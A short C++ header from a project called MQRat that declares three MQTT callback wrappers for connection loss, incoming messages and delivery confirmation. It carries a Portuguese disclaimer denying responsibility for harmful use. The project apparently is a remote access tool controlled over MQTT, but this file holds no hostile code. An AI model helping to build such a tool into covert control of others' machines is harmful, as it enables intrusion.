/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#ifndef WRAPPERS_HPP
#define WRAPPERS_HPP

#include "mqtt_client.hpp"

namespace Wrappers {
    void onLost(void *ctx, char *c);
    int onMsgReceived(void* context, char* topicName, int topicLen, MQTTClient_message* message);
    void onDelivered(void* ctx, MQTTClient_deliveryToken dt);
}

#endif
